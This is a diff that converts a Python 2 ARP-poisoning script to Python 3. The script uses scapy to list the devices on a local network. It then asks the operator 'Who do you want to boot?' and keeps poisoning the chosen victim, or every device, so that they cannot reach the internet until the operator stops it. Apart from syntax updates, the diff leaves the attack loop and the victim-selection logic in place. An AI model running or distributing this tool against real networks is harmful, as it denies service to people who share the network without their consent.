@@ -11,6 +11,7 @@
 
 import time
 import os
+from builtins import input
 from scapy.all import *
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -49,11 +50,11 @@ def get_lan_ip():
   return ip[0]
 
 def printdiv():
-  print '--------------------'
+  print('--------------------')
 
 # Check for root
 if os.geteuid() != 0:
-  print "You need to run the script as a superuser"
+  print('You need to run the script as a superuser')
   exit()
 
 # Search for stuff every time we refresh
@@ -75,32 +76,33 @@ while refreshing:
   # Get a list of devices and print them to the screen
   devices = get_ip_macs(ip_range)
   printdiv()
-  print "Connected ips:"
+  print('Connected ips:')
   i = 0
   for device in devices:
-    print '%s)\t%s\t%s' % (i, device[0], device[1])
+    print('{})\t{}\t{}'.format(i, device[0], device[1]))
     # See if we have the gateway MAC
     if device[0] == gateway_ip:
       gateway_mac = device[1]
     i+=1
 
   printdiv()
-  print 'Gateway ip:  %s' % gateway_ip
+  print('Gateway ip:  {}'.format(gateway_ip))
   if gateway_mac != '12:34:56:78:9A:BC':
-    print "Gateway mac: %s" % gateway_mac
+    print('Gateway mac: {}'.format(gateway_mac))
   else:
-    print 'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over'
+    print('Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over')
   printdiv()
   
   # Get a choice and keep prompting until we get a valid letter or a number
   # that is in range
-  print "Who do you want to boot?"
-  print "(r - Refresh, a - Kill all, q - quit)"
+  print('Who do you want to boot?')
+  print('(r - Refresh, a - Kill all, q - quit)')
 
   input_is_valid = False
   killall = False
   while not input_is_valid:
-    choice = raw_input(">")
+    choice = input(">")
+    assert isinstance(choice, str)
     if choice.isdigit():
       # If we have a number, see if it's in the range of choices
       if int(choice) < len(devices) and int(choice) >= 0:
@@ -120,24 +122,25 @@ while refreshing:
       exit()
     
     if not input_is_valid:
-      print 'Please enter a valid choice'
+      print('Please enter a valid choice')
 
 # Once we have a valid choice, we decide what we're going to do with it
 if choice.isdigit():
   # If we have a number, loop the poison function until we get a
-  # keyboard inturrupt (ctl-c)
+  # keyboard inturrupt (ctrl-c)
   choice = int(choice)
   victim = devices[choice]
-  print "Preventing %s from accessing the internet..." % victim[0]
+  print('Preventing {} from accessing the internet...'.format(victim[0]))
   try:
     while True:
       poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
       restore(victim[0], victim[1], gateway_ip, gateway_mac)
-      print '\nYou\'re welcome!'
+      print('\nYou\'re welcome!')
 elif killall:
   # If we are going to kill everything, loop the poison function until we
-  # we get a keyboard inturrupt (ctl-c)
+  # we get a keyboard inturrupt (ctrl-c)
+  print('Preventing everyone from accessing the internet...') 
   try:
     while True:
       for victim in devices:
@@ -145,5 +148,5 @@ elif killall:
   except KeyboardInterrupt:
     for victim in devices:
       restore(victim[0], victim[1], gateway_ip, gateway_mac)
-    print '\nYou\'re welcome!'
+    print('\nYou\'re welcome!')
     
